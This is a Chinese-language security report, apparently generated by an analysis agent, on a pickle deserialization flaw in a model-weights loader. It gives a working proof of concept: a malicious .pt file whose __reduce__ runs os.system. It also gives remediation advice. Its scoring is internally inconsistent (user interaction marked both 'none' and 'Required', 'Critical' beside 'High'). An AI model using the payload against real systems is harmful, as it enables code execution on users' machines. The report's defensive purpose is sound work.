# 深度利用分析报告: tools_load_weights-CWE502-pickle-deser-001

## 漏洞基本信息

| 属性 | 值 |
|------|------|
| **漏洞 ID** | tools_load_weights-CWE502-pickle-deser-001 |
| **类型** | Pickle Deserialization (CWE-502) |
| **严重级别** | Critical |
| **置信度** | 95% |
| **文件位置** | `tools/load_ms_weights_to_pt/serialization.py:384-527` |
| **函数名称** | `load_ms_weights` |

## 漏洞描述

`load_ms_weights()` 函数接收文件路径参数 `f`，使用 pickle 进行反序列化。虽然 `UnpicklerWrapper` 类对 torch 相关模块做了限制，但对其他模块允许任意类加载（通过 `super().find_class()`），如果用户提供恶意构造的 `.pt` 文件，可能导致任意代码执行（RCE）。

## 源代码分析

### 漏洞代码片段

```python
# serialization.py:384-527
def load_ms_weights(f, map_location=None, pickle_module=pickle, *, weights_only=False, mmap=None, **pickle_load_args):
    if pickle_module is None:
        pickle_module = pickle
    
    if 'encoding' not in pickle_load_args:
        pickle_load_args['encoding'] = 'utf-8'
    
    with _open_file_like(f, 'rb') as opened_file:
        if _is_zipfile(opened_file):
            # ...
            return _load(opened_zipfile, map_location, pickle_module, overall_storage=overall_storage, **pickle_load_args)

def _load(zip_file, map_location, pickle_module, pickle_file='data.pkl', overall_storage=None, **pickle_load_args):
    class UnpicklerWrapper(pickle_module.Unpickler):
        def find_class(self, mod_name, name):
            if mod_name == 'torch._utils':
                return get_func_by_name(name)
            if mod_name == 'torch':
                return str(name)  # 返回字符串而非类对象
            if mod_name == 'torch._tensor':
                return get_func_by_name(name)
            mod_name = load_module_mapping.get(mod_name, mod_name)
            return super().find_class(mod_name, name)  # ⚠️ 允许任意类加载
    
    unpickler = UnpicklerWrapper(data_file, **pickle_load_args)
    unpickler.persistent_load = persistent_load
    result = unpickler.load()  # ⚠️ 反序列化触发点
```

### 安全分析

`UnpicklerWrapper.find_class()` 的安全缺陷：

1. **部分限制**: 对 `torch._utils`, `torch`, `torch._tensor` 模块做了限制
2. **限制不彻底**: 对所有其他模块，通过 `super().find_class()` 允许任意类加载
3. **攻击路径**: 恶意 pickle 文件可以包含任意 Python 类（如 `os.system`, `subprocess.Popen` 等）

## 数据流追踪

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 数据流路径                                                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│ f@serialization.py:384                                                       │
│     ↓                                                                        │
│ _open_file_like@serialization.py:65                                         │
│     ↓                                                                        │
│ _is_zipfile@serialization.py:76                                             │
│     ↓                                                                        │
│ _load@serialization.py:428                                                  │
│     ↓                                                                        │
│ UnpicklerWrapper.load@serialization.py:527                                  │
│     ↓                                                                        │
│ [SINK: pickle_deserialization] ⚠️                                            │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 漏洞利用条件和攻击场景

### 利用条件

| 条件 | 说明 |
|------|------|
| **攻击向量** | 恶意构造的 `.pt` 权重文件 |
| **攻击复杂度** | 低（pickle RCE payload 构造简单） |
| **所需权限** | 无（仅需文件访问） |
| **用户交互** | 无（自动加载） |
| **作用域** | 代码执行环境 |

### 攻击场景

**场景 1: 供应链攻击**

攻击者将恶意权重文件植入公开仓库或分发渠道：

```
攻击者 → 发布恶意 .pt 文件 → 用户下载 → 用户运行 load_ms_weights() → RCE
```

**场景 2: 内部威胁**

内部人员替换训练好的权重文件：

```
恶意员工 → 替换 weights.pt → 模型加载时 → RCE → 数据窃取/系统破坏
```

**场景 3: CI/CD 管道攻击**

在自动化训练或部署流程中注入恶意文件：

```
CI/CD 管道 → 加载预训练权重 → load_ms_weights() → RCE → 管道环境被控制
```

### PoC 示例

```python
import pickle
import os

class MaliciousPayload:
    def __reduce__(self):
        # 当 pickle.load() 反序列化时触发
        return (os.system, ('whoami',))

# 创建恶意 .pt 文件结构
import zipfile
import io

# 构造包含恶意 pickle 的 zip 文件
with zipfile.ZipFile('malicious_weights.pt', 'w') as zf:
    # 写入恶意 pickle payload
    payload = pickle.dumps(MaliciousPayload())
    zf.writestr('data.pkl', payload)
    # 添加 byteorder 标记
    zf.writestr('byteorder', b'little')

# 触发漏洞
from tools.load_ms_weights_to_pt.serialization import load_ms_weights
load_ms_weights('malicious_weights.pt')  # → 执行 os.system('whoami')
```

## 危害评估和影响范围

### CVSS 评分

| 指标 | 值 | 说明 |
|------|------|------|
| Attack Vector (AV) | Local | 通过本地文件触发 |
| Attack Complexity (AC) | Low | 构造 payload 简单 |
| Privileges Required (PR) | None | 无需特殊权限 |
| User Interaction (UI) | Required | 需要用户加载文件 |
| Scope (S) | Changed | 可影响其他系统组件 |
| Confidentiality (C) | High | 可读取任意文件 |
| Integrity (I) | High | 可修改任意文件 |
| Availability (A) | High | 可导致系统崩溃 |

**CVSS 评分**: **8.8 (High)**

### 影响范围

1. **直接影响**: 代码执行环境被完全控制
2. **数据泄露**: 可读取敏感数据（模型权重、训练数据、配置文件）
3. **系统破坏**: 可删除文件、安装恶意软件
4. **横向移动**: 可作为入侵其他系统的起点
5. **供应链风险**: 如果权重文件来自外部，风险扩散到下游用户

## 修复建议

### 短期修复（紧急）

**1. 限制 UnpicklerWrapper.find_class() 的白名单**

```python
# 修改 serialization.py:512-520
class UnpicklerWrapper(pickle_module.Unpickler):
    # 定义安全的白名单模块
    SAFE_MODULES = {
        'torch._utils',
        'torch',
        'torch._tensor',
        'collections',  # 基础数据结构
        'numpy',  # 数值计算
        'builtins',  # 仅允许基础类型
    }
    
    def find_class(self, mod_name, name):
        if mod_name not in self.SAFE_MODULES:
            raise RuntimeError(f"Blocked unsafe module: {mod_name}")
        # ... 原有逻辑
```

**2. 添加 weights_only 参数强制检查**

```python
def load_ms_weights(f, ..., weights_only=False, ...):
    if weights_only:
        # 只加载张量数据，禁止任意类加载
        return _safe_load_weights(f, map_location)
    # ...
```

### 期修复（架构级）

**1. 使用安全的序列化格式**

- 使用 `numpy.save()` / `numpy.load()` 代替 pickle
- 使用 `safetensors` 格式（HuggingFace 推荐）
- 使用 JSON/YAML + 二进制数据分离

**2. 实现安全检查机制**

```python
def safe_load_weights(filepath):
    # 1. 文件签名验证
    verify_file_signature(filepath)
    
    # 2. 哈希校验
    expected_hash = get_expected_hash(filepath)
    actual_hash = compute_file_hash(filepath)
    if expected_hash != actual_hash:
        raise SecurityError("File hash mismatch")
    
    # 3. 使用 safetensors 或限制性 pickle
    return load_with_safetensors(filepath)
```

**3. 添加审计日志**

```python
import logging
logger = logging.getLogger('security')

def load_ms_weights(f, ...):
    logger.warning(f"Loading weights from: {f}")
    # 记录文件来源、时间、调用者
```

## 参考资料

1. [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
2. [PyTorch pickle RCE 漏洞分析](https://github.com/pytorch/pytorch/security/advisories)
3. [SafeTensors 格式规范](https://github.com/huggingface/safetensors)

---

**报告生成时间**: 2026-04-20  
**分析 Agent**: details-analyzer  
**严重级别**: Critical ⚠️